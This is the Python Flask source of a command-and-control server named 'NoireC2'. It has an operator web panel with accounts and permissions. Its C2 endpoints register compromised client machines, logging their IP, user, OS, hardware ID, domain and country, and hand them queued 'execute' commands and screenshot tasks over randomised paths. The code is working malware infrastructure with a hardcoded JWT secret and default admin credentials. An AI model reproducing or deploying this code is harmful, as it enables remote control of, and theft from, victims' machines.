import flask
from flask_sqlalchemy import SQLAlchemy
import flask_login
from flask_socketio import SocketIO, emit
import os
import secrets
import bcrypt
import base64
import jwt
from eventlet import wsgi, listen
from requests import session

app = flask.Flask(__name__)
app.secret_key = secrets.token_hex()
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
socketio = SocketIO(app)

# Add security headers
@app.after_request
def add_security_headers(resp):
    resp.headers['Content-Security-Policy']='default-src \'self\''
    resp.headers['Server']='NoireC2'
    resp.headers['X-Powered-By']='NoireC2'
    resp.headers['X-Content-Type-Options']='nosniff'
    resp.headers['X-XSS-Protection']='1; mode=block'
    resp.headers['Content-Type']='text/html; charset=utf-8'
    return resp

db = SQLAlchemy()

class User(db.Model):
    """A User in the database
    """
    __tablename__ = 'users'

    username = db.Column(db.String, primary_key=True)
    password = db.Column(db.String)
    authenticated = db.Column(db.Boolean, default=False)
    groups = db.Column(db.String, default='users')
    administrator = db.Column(db.Boolean, default=False)
    change_user_passwords = db.Column(db.Boolean, default=False)
    change_admin_passwords = db.Column(db.Boolean, default=False)
    change_user_permissions = db.Column(db.Boolean, default=False)
    change_admin_permissions = db.Column(db.Boolean, default=False)

    def has_permission(self, permission:str) -> bool:
        """
        Check if the user has a specific permission.

        Args:
            permission (str): The permission to check.

        Returns:
            bool: True if the user has the permission, False otherwise.
        """
        permsList = ['change_user_passwords', 'change_admin_passwords',
                     'change_user_permissions', 'change_admin_permissions', 'administrator']
        if permission not in permsList: return False
        if getattr(self, permission):
            return getattr(self, permission)
        for group in self.groups.split(','):#Use order as priority? Assume group exists
            currentGroup = Group.query.filter_by(name=group).first()
            if getattr(currentGroup, permission): return True
        return False

    def is_active(self):
        """True, as all users are active."""
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        """Return True if the user is authenticated."""
        return self.authenticated

    def is_anonymous(self):
        """False, as anonymous users aren't supported."""
        return False
    
class Group(db.Model):
    """A Group in the database
    """
    __tablename__ = "groups"
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String)
    owner = db.Column(db.String)
    members = db.Column(db.String)
    
class Device(db.Model):
    """A Device connected to the server
    """
    __tablename__= "devices"
    
    id = db.Column(db.Integer, primary_key=True)
    jwt = db.Column(db.String)
    owner = db.Column(db.String)
    nickname = db.Column(db.String, default="")
    ip = db.Column(db.String)
    user = db.Column(db.String)
    os = db.Column(db.String)
    domain = db.Column(db.String)
    country = db.Column(db.String)
    hwid = db.Column(db.String)
    notes = db.Column(db.String)
    initialConnection = db.Column(db.String)
    uniquePath = db.Column(db.String)
    taskPath = db.Column(db.String)
    responsePath = db.Column(db.String)

class Task(db.Model):
    """A task requested for a client to run
    """
    
    __tablename__ = "tasks"
    
    id = db.Column(db.String, primary_key=True)
    owner = db.Column(db.String)
    command = db.Column(db.String)
    arguments = db.Column(db.String)
    running = db.Column(db.Boolean, default=False)
    response = db.Column(db.String, default='NOTRUN')

db.init_app(app)
with app.app_context():
    db.create_all()

# Define the login manager
login_manager = flask_login.LoginManager()
login_manager.init_app(app)
login_manager.refresh_view = '/login'
login_manager.login_view = '/login'
    
@login_manager.user_loader
def user_loader(user_id):
    return User.query.get(user_id)

def valid_login(username:str, passw:str) -> bool:
    """Check if the given credentials are a valid account

    Args:
        username (str): The username to check
        passw (str): The password to check

    Returns:
        bool: If there is an account with the given credentials or not
    """
    if not username or not passw: return False
    user = User.query.get(username)
    if not user: return False
    try:
        passw = bytes(passw, 'utf-8')
        uPassword = bytes(user.password, 'utf-8')
        return bcrypt.checkpw(passw, uPassword)
    except:
        return False

def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
    """
    Add a user to the database.

    Args:
        username (str): The username of the account to add.
        passw (str): The password of the account to add.
        isAdmin (bool, optional): Whether the account should have admin privileges.
            Defaults to False.

    Returns:
        str: A message indicating whether the account was created successfully.
    """
    if not username or not passw: return "All fields are required"
    user = User.query.get(username)
    if user: return "An account with this username already exists"
    passw = bytes(passw, 'utf-8')
    salt = bcrypt.gensalt(12)
    passw = str(bcrypt.hashpw(passw, salt))[2:-1]
    groups = ['users']
    if isAdmin: groups.append('admins')
    newUser = User(username=username, administrator = isAdmin, password=str(passw), groups=",".join(groups))
    db.session.add(newUser)
    db.session.commit()
    return 'Account created successfully'

def deleteAccount(username:str) -> str:
    """
    Delete a user from the database.

    Args:
        username (str): The username of the account to delete.

    Returns:
        str: A message indicating whether the account was deleted successfully.
    """
    user = User.query.get(username)
    if not user: return "Account not found"
    #Transfer all clients to the admin account
    for device in Device.query.filter_by(owner=user.username):
        device.owner = 'admin'
    db.session.delete(user)
    db.session.commit()
    return 'Account deleted successfully'

def addGroup(name:str, owner:str) -> str:
    """
    Add a group to the database.

    Args:
        name (str): The name of the group to add.
        owner (str): The owner of the group.

    Returns:
        str: A message indicating whether the group was created successfully.
    """
    # Check if required fields are provided
    if not name: return "Group name is required"

    # Check if the group already exists
    group = Group.query.filter_by(name=name).first()
    if group: return "A group with this name already exists"

    # Create the new group
    new_group = Group(
        name=name,
        owner=owner
    )
    
    # Add the new group to the database
    db.session.add(new_group)
    db.session.commit()

    return 'Group created successfully'

def deleteGroup(name:str) -> str:
    """
    Delete a group from the database.

    Args:
        name (str): The name of the group to delete.

    Returns:
        str: A message indicating whether the group was deleted successfully.
    """
    group = Group.query.filter_by(name=name).first()
    if not group: return "Group not found"
    db.session.delete(group)
    db.session.commit()
    return 'Group deleted successfully'

#Startup checks
with app.app_context():
    a = addAccount('system', '', True)
    a = addAccount('admin', 'test', True)
    a = addGroup('admins', 'admin')
    a = addGroup('users', 'system')
    
    #Delete all known links for devices, so new can be generated
    if Device.query.all():
        for dev in Device.query.all():
            dev.uniquePath, dev.taskPath, dev.responsePath = '', '', ''

@app.errorhandler(404)
def not_found(error):
    return flask.render_template('404.html'), 404

@app.route('/')
def indexPage():
    return flask.redirect(flask.url_for('loginPage'))

#Load icon and CSS stylesheet
@app.route('/favicon.ico')
def favicon():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')

@app.route('/style.css')
def stylesheet():
    return flask.send_from_directory(os.path.join(app.root_path, 'static'), 'style.css')

@app.route('/login', methods=['POST', 'GET'])
def loginPage():
    """
    This function is the handler for the '/login' endpoint, which is accessed via both POST and GET methods.
    It renders the 'logIn.html' template and passes the 'error' variable to it.

    Args:
        None

    Returns:
        If the request method is POST and the login credentials are valid, it redirects to the 'overviewPage'.
        If the user is remembered (i.e., logged in previously), it redirects to the 'overviewPage'.
        Otherwise, it renders the 'logIn.html' template with the 'error' variable.
    """
    try:
        del flask.session['users']
        del flask.session['groups']
    except:
        pass
    error = None
    if flask.request.method == 'POST':
        if valid_login(flask.request.form['username'],
                       flask.request.form['password']):
            user = User.query.get(flask.request.form['username'])
            user.authenticated = True
            db.session.commit()
            flask_login.login_user(user, remember=True)
            next = flask.request.args.get('next')
            if next and not next.startswith('/') and not next.startswith(flask.request.host):
                return flask.abort(400)
            # deepcode ignore OR: False positive
            return flask.redirect(next or flask.url_for('overviewPage'))
        else:
            error = 'Invalid username/password'
    if flask_login.login_remembered():
        return flask.redirect(flask.url_for('overviewPage'))
    try:
        user = flask.request.form['username']
    except KeyError:
        user = ""
    return flask.render_template('logIn.html', error = error)

@app.route('/logout')
@flask_login.login_required
def logoutPage():
    """
    Logs out the current user by setting authenticated to False, committing the change to the database, and logging out the user. 
    Returns the rendered 'logOut.html' template.
    """
    user = User.query.get(flask_login.current_user.username)
    user.authenticated = False#might not need ths due to flask_login.logout_user
    db.session.commit()
    flask_login.logout_user()
    return flask.render_template('logOut.html')#might just want to redirect to login page


@app.route('/overview')
@flask_login.login_required
def overviewPage():
    devAmount = 0
    if Device.query.all():
        devAmount = len(Device.query.all())
    return flask.render_template('overview.html', user = flask_login.current_user.username, devices = devAmount)

@app.route('/clients', methods=['GET', 'POST'])
@flask_login.login_required
def clientsPage():
    if flask.request.method == 'GET':
        return flask.render_template('clients.html', clients = Device.query.all(), numClients = len(Device.query.all()))
    else:
        if Device.query.filter_by(jwt=flask.request.form['jwt']).all():
            if flask.request.form['action'] == 'execute':
                task = Task(id=generateRandPath(), owner=flask.request.form['jwt'],
                            command='execute', arguments=flask.request.form['arguments'])
                db.session.add(task)
                db.session.commit()
            flask.flash('Command recorded, ID: '+ task.id, 'success')#doesnt show because redirect, show on load template?
            return flask.render_template('clients.html', clients = Device.query.all(), numClients = len(Device.query.all()))
        return flask.render_template('clients.html', clients = Device.query.all(), numClients = len(Device.query.all()))

#Settings stuff
@app.route('/settings')
@flask_login.fresh_login_required
def settingsPage():
    """
    Render the settings page for the logged in user.

    This function is a route handler for the '/settings' endpoint. It requires a fresh login session to access.
    It renders the 'settings.html' template and passes the 'administrator' variable to the template.
    The 'administrator' variable is set to the result of calling the 'has_permission' method on the
    'current_user' object of the 'flask_login' module, with the argument 'administrator'.

    Returns:
        The rendered 'settings.html' template.

    """
    return flask.render_template('settings.html', administrator = flask_login.current_user.has_permission('administrator'))

@app.route('/settings/change_password', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def changePassPage():
    """
    Route for resetting user passwords. Requires fresh login. If a user has the permissions 
    to change both user and admin passwords, all users are shown. If a user has the permission 
    to change only user passwords, only non-admin users are shown. If a user has the permission 
    to change only admin passwords, only admin users are shown. If a user does not have the 
    permissions to change any passwords, only the current user is shown. If a user submits a 
    password reset form, the password is updated in the database if the passwords match and the 
    username is valid. Returns the rendered changePassword.html template with a list of users 
    to choose from.
    """
    user = flask_login.current_user
    aUsers = User.query.all()
    if not user.has_permission('change_user_passwords') and not user.has_permission('change_admin_passwords'):
        users = user
    elif user.has_permission('change_user_passwords') and user.has_permission('change_admin_passwords'):
        users = aUsers
    elif user.has_permission('change_user_passwords'):
        users = []
        for user in aUsers:
            if not user.has_permission('administrator'): users.append(user)
    else:
        users = []
        for user in aUsers:
            if user.has_permission('administrator'): users.append(user)
    users = [user.username for user in users]
    if flask.request.method == 'POST':
        try:
            if flask.request.form['password'] != flask.request.form['cPassword']:
                flask.flash('The given passwords do not match', 'error')
            else:
                user = User.query.get(flask.request.form['users'])
                users.index(user.username)#Check if user is available for them to edit
                passw = flask.request.form['password'].encode('utf-8')
                user.password = str(bcrypt.hashpw(passw, bcrypt.gensalt(12)))[2:-1]
                db.session.commit()
                flask.flash('Password has been changed', 'success')
        except:
            flask.flash('An invalid username was given', 'error')
    return flask.render_template('changePassword.html', users = users)

@app.route('/settings/delete_user', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def deleteUserPage():
    """
    Delete a user from the database. Requires fresh login.
    Admins can delete any user. Non-admins with the delete_user permission can delete Non-admin users.
    Non-admins without the delete_user permission can only delete themselves.
    Username validation is done on delete account.
    
    Returns:
        flask.render_template: The rendered deleteUser.html template with a list of users to choose from.
    """
    user = flask_login.current_user
    if not user.has_permission('administrator'):
        if not user.has_permission('delete_user'):
            users = [user]
        else:
            users = User.query.filter_by(administrator=False).all()
    else:
        users = User.query.all()
        users.remove(User.query.get('admin'))
    users = [user.username for user in users]
    if flask.request.method == 'POST':
        try:
            user = User.query.get(flask.request.form['users'])
            if user.username != flask.request.form['userCheck']:
                flask.flash('Validation failed - The usernames do not match', 'error')
            else:
                users.index(user.username)#Check if user is available for them to edit
                deletedUser = deleteAccount(user.username)
                flask.flash(deletedUser, 'info')
        except:
            flask.flash('An invalid username was given', 'error')
    return flask.render_template('deleteUser.html', users = users)

@app.route('/settings/admin/delete_group', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def deleteGroupPage():
    user = flask_login.current_user
    if not user.has_permission('administrator'):
        flask.flash('You do not have access to this page', 'error')
        return flask.redirect(flask.url_for('settingsPage'))
    groups = Group.query.all()
    groups.remove(Group.query.filter_by(name='admins').first())
    groups = [group.name for group in groups]
    if flask.request.method == 'POST':
        try:
            group = Group.query.filter_by(name=flask.request.form['groups']).first()
            if group.name != flask.request.form['groupCheck']:
                flask.flash('Validation failed - The names do not match', 'error')
            else:
                groups.index(group.name)#Check if user is available for them to edit
                deletedGroups = deleteGroup(group.name)
                flask.flash(deletedGroups, 'info')
        except:
            flask.flash('An invalid group name was given', 'error')
    return flask.render_template('deleteGroup.html', groups = groups)
        
@app.route('/settings/admin/change_permissions')
@flask_login.fresh_login_required
def selectChangePermsPage():
    user = flask_login.current_user
    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
        flask.flash('You do not have access to this page', 'error')
        return flask.redirect(flask.url_for('settingsPage'))
    users = []
    groups = []
    if user.has_permission('change_user_permissions') or user.has_permission('change_admin_permissions'):
        aUsers = User.query.all()
        groups = Group.query.filter_by(owner=user.username).all()
        if user.has_permission('change_user_permissions') and user.has_permission('change_admin_permissions'):
            groups = Group.query.all()
            users = aUsers
        elif user.has_permission('change_user_permissions'):
            for u in aUsers:
                if not u.has_permission('administrator'): users.append(u)
        else:
            for u in aUsers:
                if u.has_permission('administrator'): users.append(u)
    flask.session['users'] = [u.username for u in users]
    flask.session['groups'] = [g.name for g in groups]
    return flask.render_template('selectChangePermissions.html', users = flask.session['users'], groups = flask.session['groups'])

@app.route('/settings/admin/change_permissions/select', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def changePermsPage():
    user = flask_login.current_user
    if not user.has_permission('change_user_permissions') and not user.has_permission('change_admin_permissions'):
        flask.flash('You do not have access to this page', 'error')
        return flask.redirect(flask.url_for('settingsPage'))
    try:
        try:
            users = flask.request.args['users']
            flask.session['users'].index(users)
        except:
            groups = flask.request.args['groups']
            flask.session['groups'].index(groups)
            users = None
        if users:
            target = 'users'
            selected = User.query.filter_by(username=users).first()
        else:
            target = 'groups'
            selected = Group.query.filter_by(name = groups).first()
        if flask.request.method == 'GET':
            return flask.render_template('changePermissions.html', target = target, selected = selected, isAdmin = user.administrator, editAdmins = user.has_permission('change_admin_permissions'))
        else:#probably need more verification/security checks on this
            if flask.request.form.get('selectAdmin'): selected.administrator = True
            else: selected.administrator = False
            if flask.request.form.get('selectEditAdmins'): selected.change_admin_permissions = True
            else: selected.change_admin_permissions = False
            if flask.request.form.get('selectEditUsers'): selected.change_user_permissions = True
            else: selected.change_user_permissions = False
            if flask.request.form.get('selectChangeAdminPW'): selected.change_admin_passwords = True
            else: selected.change_admin_passwords = False
            if flask.request.form.get('selectChangeUserPW'): selected.change_user_passwords = True
            else: selected.change_user_passwords = False
            if flask.request.form.get('selectDeleteUsers'): selected.delete_users = True
            else: selected.delete_users = False
            flask.flash('Permissions have been changed', 'success')
            db.session.commit()
    except:
        try:
            del flask.session['users']
            del flask.session['groups']
        except:
            pass
        flask.flash('An invalid target was given', 'error')
        return flask.redirect(flask.url_for('selectChangePermsPage'))
    try:
        return flask.redirect(flask.url_for('changePermsPage', users=flask.request.args['users']))
    except:
        return flask.redirect(flask.url_for('changePermsPage', groups=flask.request.args['groups']))

@app.route('/settings/admin/create_user', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def createUserPage():
    user = flask_login.current_user
    if not user.has_permission('administrator'):
        flask.flash('You do not have access to this page', 'error')
        return flask.redirect(flask.url_for('settingsPage'))
    if flask.request.method == 'POST':
        username = flask.request.form.get('username')
        password = flask.request.form.get('password')
        vPassword = flask.request.form.get('vPassword')
        if password == vPassword:
            newUser = addAccount(username, password)
            flask.flash(newUser, 'info')
        else:
            flask.flash('Passwords do not match', 'error')
    return flask.render_template('createUser.html')

@app.route('/settings/admin/create_group', methods=['GET', 'POST'])
@flask_login.fresh_login_required
def createGroupPage():
    user = flask_login.current_user
    if not user.has_permission('administrator'):
        flask.flash('You do not have access to this page', 'error')
        return flask.redirect(flask.url_for('settingsPage'))
    if flask.request.method == 'POST':
        groupName = flask.request.form.get('groupName')
        newGroup = addGroup(groupName, session['username'])
        flask.flash(newGroup, 'info')
    return flask.render_template('createGroup.html')

#C2 interface
def validateC2Client(request:flask.Request) -> bool:
    """
    This function validates the C2 client by checking the request headers and decoding the NClient-Token. 
    It returns a boolean value indicating whether the client is valid or not.
    """
    try:
        if request.headers['User-Agent'].split()[0] != 'NClient': return False
        cToken = request.headers['NClient-Token']
        cToken = jwt.decode(cToken, 'Noire', algorithms=['HS256'])
        #if cToken['ip'] != request.remote_addr: return False #Blocks Proxies, VPN's and LAN devices
        cToken['os']
        cToken['user']
        cToken['hwid']
        cToken['time']
        cToken['country']
        cToken['domain']
        cToken['uID']
        #add check for payload, validate encryption etc
        #Add check if NClient-Token (jwt) IP is same as request IP
        return True
    except KeyError or jwt.DecodeError:
        return False

def generateRandPath() -> str:
    """
    A function that generates a random path of length 12 consisting of alphanumeric characters.
    Returns: str
    """
    x = ""
    for y in range(12):
        x += secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
    return x

@app.route('/contact')
def contactC2Page():
    """
    A route for the contact page. Validates the C2 client, decodes the JWT, generates random paths, 
    and adds a new client to the database if it doesn't exist. Otherwise, retrieves the paths from 
    the existing client. Finally, it returns a response with the paths in the headers.
    """
    if not validateC2Client(flask.request): return not_found('Invalid')
    jwT = flask.request.headers['NClient-Token']
    if not Device.query.filter_by(jwt=jwT).first():
        token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
        try:
            owner = token['uID']
        except:
            owner = 'admin'
        uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
        newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP,
                           initialConnection=token['time'], country=token['country'], domain=token['domain'], owner=owner)
        db.session.add(newClient)
        db.session.commit()
    else:
        a = Device.query.filter_by(jwt=jwT).first()
        uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
    resp = flask.make_response("")
    resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
    return resp
    

@app.route('/c/<c2ID>/<pName>', methods=["GET", "POST"])
def instructReponsePages(c2ID:str, pName:str):
    """
    This function handles the response from a C2 client.

    Args:
        c2ID (str): The unique ID of the C2 client.
        pName (str): The name of the page (task or response).

    Returns:
        str or flask.Redirect: The response to be sent back to the C2 client.
    """
    if not validateC2Client(flask.request): return not_found("Invalid")
    jwT = flask.request.headers['NClient-Token']
    try:
        gjwT = Device.query.filter_by(jwt=jwT).first()
    except KeyError:
        return not_found("Skipped initialisation")#if not in the system, something is fishy
    if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
    if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
    if pName == gjwT.taskPath:
        if flask.request.method != "GET": return not_found("Bad method on control path")
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
        if not tasks: return ""
        tR = []
        for task in tasks:
            tR.append(jwt.encode({'id': task.id, 'command': task.command, 'args': task.arguments}, 'Noire'))#allow this to be modified
            task.running = True
        db.session.commit()
        # deepcode ignore XSS: Users will never touch this, only NC2-HTTP clients.
        return '\n'.join(tR)
    else:
        if flask.request.method != "POST": return not_found("Bad method on control path")
        try:
            task = flask.request.headers['NClient-TaskResponse']
        except KeyError:
            return not_found("No finished task")#flag this in logs
        task = base64.b64decode(task).split(b'*')
        taskID = task[0].decode(); taskResponse = task[1]
        setTask = Task.query.filter_by(owner=jwT, id=taskID).all()
        if not setTask: return not_found('No task with ID')#flag this in logs
        setTask = setTask[0]
        setTask.running = False
        if setTask.command == 'screenshot':
            setTask.response = taskResponse
        setTask.response = base64.b64encode(taskResponse)
        db.session.commit()
        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
        if not tasks: return ""
        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')#Don't return redirect, just return code 200

#Run forever
def start_server(port:int):
    """
    Start a server on the specified port.

    Args:
        port (int): The port number on which the server will listen.

    Returns:
        None
    """
    server = wsgi.Server(listen(('0.0.0.0', port)), '127.0.0.1', app=app)
    print(f"Web server running on http://127.0.0.1:{str(port)}/")
    print(server.address)
    server.serve_forever()